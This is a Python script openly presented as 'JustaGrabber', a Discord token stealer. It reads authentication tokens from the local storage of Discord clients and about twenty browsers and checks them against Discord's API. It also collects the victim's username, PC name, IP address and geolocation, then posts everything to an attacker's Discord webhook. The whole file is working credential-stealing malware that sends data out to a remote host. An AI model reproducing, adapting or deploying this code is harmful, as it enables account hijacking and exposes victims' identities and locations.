"""
         ██╗██╗   ██╗███████╗████████╗ █████╗  ██████╗ ██████╗  █████╗ ██████╗ ██████╗ ███████╗██████╗     ██╗   ██╗    ██╗   ██╗  ██╗
         ██║██║   ██║██╔════╝╚══██╔══╝██╔══██╗██╔════╝ ██╔══██╗██╔══██╗██╔══██╗██╔══██╗██╔════╝██╔══██╗    ██║   ██║   ███║   ██║  ██║
         ██║██║   ██║███████╗   ██║   ███████║██║  ███╗██████╔╝███████║██████╔╝██████╔╝█████╗  ██████╔╝    ██║   ██║   ╚██║   ███████║
    ██   ██║██║   ██║╚════██║   ██║   ██╔══██║██║   ██║██╔══██╗██╔══██║██╔══██╗██╔══██╗██╔══╝  ██╔══██╗    ╚██╗ ██╔╝    ██║   ╚════██║
    ╚█████╔╝╚██████╔╝███████║   ██║   ██║  ██║╚██████╔╝██║  ██║██║  ██║██████╔╝██████╔╝███████╗██║  ██║     ╚████╔╝ ██╗ ██║██╗     ██║
     ╚════╝  ╚═════╝ ╚══════╝   ╚═╝   ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝      ╚═══╝  ╚═╝ ╚═╝╚═╝     ╚═╝
     
     Made by kldiscord on github. Thank you for using!
     + This is not the last version of justagrabber, I will update many functions!!
""" # JustaGrabber by KLDiscord

import os, re, json, urllib.request,datetime # Importing modules

WEBHOOK_URL = ''
# Type your discord webhook url over here 

Ping_me = True # IF true, Your webhook will mention you when it grab tokens.
Blacklist = ["Blacklistedpeople1","KLDiscord"] # Blacklisted peoples. Only PC Name! 
# If you want to check, type `print(os.getenv('USER', os.getenv('USERNAME', 'user')))` in idle, terminal or anywhere.

# Checking if pcname in blacklist
if os.getenv('USER', os.getenv('USERNAME', 'user')) in Blacklist:
    print("Blacklisted")
    sys.exit()

# Finding tokens method
def find_tokens(path):
    path += '\\Local Storage\\leveldb' # Appdata folder

    tokens = [] # Tokens list

    for file_name in os.listdir(path):
        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
            continue

        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                for token in re.findall(regex, line):
                    if token.startswith("N") or token.startswith("O") or token.startswith("mfa"):
                        tokens.append(token)
    return tokens

# Main
def JustaGrabber():
    # Token's paths
    appdata = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')

    paths = { # Browser's path
        '<Discord> ': roaming + '\\Discord',
        '<LightCord> ': roaming + '\\Lightcord',
        '<Discord_Canary>' : roaming + '\\discordcanary',
        '<Discord_PTB>' : roaming + '\\discordptb',
        '<Google_Chrome>' : appdata + '\\Google\\Chrome\\User Data\\Default',
        '<Opera>' : roaming + '\\Opera Software\\Opera Stable',
        '<Opera GX>' : roaming + '\\Opera Software\\Opera GX Stable',
        '<Amigo>' : appdata + '\\Amigo\\User Data',
        '<Torch>' : appdata + '\\Torch\\User Data',
        '<Orbitum>' : appdata + '\\Orbitum\\User Data',
        '<CentBrowse>' : appdata + '\\CentBrowse\\User Data',
        '<7Star>' : appdata + '\\7Star\\7Star\\User Data',
        '<Vivaldi>' : appdata + '\\Vivaldi\\User Data\\Default',
        '<Sputnik>' : appdata + '\\Sputnik\\Sputnik\\User Data',
        '<Chrome SxS>' : appdata + '\\Google\\Chrome SxS\\User Data',
        '<Epic Privacy Browser>' : appdata + '\\Epic Privacy Browser\\User Data',
        '<Microsoft Edge>' : appdata + 'Microsoft\\Edge\\User Data\\Default',
        '<Uran>' : appdata + 'uCozMedia\\Uran\\User Data\\Default',
        '<Brave>' : appdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        '<Yandex>' : appdata + '\\Yandex\\YandexBrowser\\User Data\\Default',
        '<Naver_whale>' : appdata + '\\Naver\\Naver Whale\\User Data\\Default',
        '<Naver_whale_Flash>' : appdata + '\\Naver\\Naver Whale Flash\\User Data\\Default'
    }

    # getting ip info
    def getipinfo():
        url = "http://ipinfo.io/json"
        responce = urllib.request.urlopen(url)
        data = json.load(responce)
        ip = data['ip']
        city = data['city']
        region = data['region']
        country = data['country']
        loc = data['loc']
        org = data['org']
        postal = data['postal']
        timezone = data['timezone']
        return ip,city,region,country,loc,org,postal,timezone

    # Sending infos
    if Ping_me:
        message = "@everyone   JustaGrabber found a new token! \n"
    message += "```md\n"

    # Find tokens
    for platform, path in paths.items():
        if not os.path.exists(path):
            continue

        message += f'\n{platform}\n\n'

        tokens = find_tokens(path)

        if len(tokens) > 0:
            for token in tokens:
                headers={ # Token checker
                    'Authorization': token
                }
                src = requests.get('https://discordapp.com/api/v8/auth/login', headers=headers)
                if src.status_code == 200:
                    message += '<Tokens_found : ' + f'{token}' + '>' + '\n'

        else: # Print when no tokens found.
            message += '[Error](No tokens found.)\n'

    headers = {
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
    }
    message += "```"

    # Sending message
    payload = json.dumps({'content': message}) # Sending tokens.
    try: # Embed
        req = urllib.request.Request(WEBHOOK_URL, data=payload.encode(), headers=headers)
        urllib.request.urlopen(req)
        today = datetime.date.today()
        alert = {
            "avatar_url":"https://media.discordapp.net/attachments/853578499096707082/904920147414908938/unknown.png",
            "name":"JustaGrabber",
            "embeds": [
                {
                    "author": {
                    "name": "JustaGrabber Grabbed token!",
                    "icon_url": "https://cdn.discordapp.com/emojis/819756986223689728.gif?size=96",
                    "url": "https://github.com/kldiscord/JustaGrabber"
                     },
                "description":f'Username : ' + os.getenv('USER', os.getenv('USERNAME', 'user'))+'⠀IP : ' + getipinfo()[0] + '⠀PC Name : ' + os.getenv("COMPUTERNAME") + '⠀\nCountry : ' + getipinfo()[3] + '⠀City : ' + getipinfo()[1] + '⠀Region : ' + getipinfo()[1] + '\nPostal : ' + getipinfo()[6] + '⠀Timezone : ' + getipinfo()[7] + '⠀Location : ' + getipinfo()[4] + '\nGoogle Map : ' + "https://www.google.com/maps/search/google+map++" + getipinfo()[4],
                "color": 0x00C7FF,
                "thumbnail":{
                    "url":"https://cdn.discordapp.com/emojis/847947696806559755.gif?size=96"
                },
                "footer": {
                    "text": f"Token found on {today} / ©kldiscord in github"
                }
            }
        ]
        } 
        requests.post(WEBHOOK_URL, json=alert) # Sending embeds
    except:
        pass

# Module chekcer
import sys
try:
    import requests
    if __name__ == "__main__":
        JustaGrabber()
except ModuleNotFoundError: # If requests module not exists, JustaGrabber will not do anything
    sys.exit()
